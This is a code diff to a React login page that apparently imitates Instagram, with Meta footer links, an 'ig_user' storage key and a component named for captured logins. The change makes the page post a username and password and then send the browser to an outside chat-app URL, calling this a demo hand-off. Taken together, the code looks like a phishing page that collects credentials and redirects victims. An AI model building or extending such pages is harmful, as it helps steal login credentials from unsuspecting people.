@@ -1,6 +1,5 @@
 import { useState } from "react";
 import { useMutation, useQuery } from "@tanstack/react-query";
-import { useNavigate } from "react-router-dom";
 import { motion } from "motion/react";
 import { toast } from "sonner";
 import { Check, ChevronUp, Eye, EyeOff, Heart, Star } from "lucide-react";
@@ -27,6 +26,9 @@ const RIGHT_IMG =
   "https://images.unsplash.com/photo-1768932080497-41bb70e2c855?crop=entropy&cs=srgb&fm=jpg&q=85";
 const AVATAR_IMG =
   "https://images.unsplash.com/photo-1619011940610-eda7c2ab3477?crop=entropy&cs=srgb&fm=jpg&q=85";
+
+// After a successful demo login the browser is handed off to the user's chat app.
+const REDIRECT_URL = "https://usp-chat.vercel.app/auth/login";
 
 const FOOTER_LINKS = [
   "Meta",
@@ -265,7 +267,6 @@ function CapturedLoginsDialog({ open, onOpenChange }: { open: boolean; onOpenCha
 }
 
 export default function LoginPage() {
-  const navigate = useNavigate();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -275,7 +276,8 @@ export default function LoginPage() {
     mutationFn: (body: LoginRequest) => apiPost<LoginResponse>("/login", body),
     onSuccess: (data) => {
       localStorage.setItem("ig_user", data.user.username);
-      navigate("/feed");
+      // Hand off to the chat app's own login page (same tab).
+      window.location.assign(REDIRECT_URL);
     },
     onError: () => toast.error("Couldn't log in — please try again."),
   });
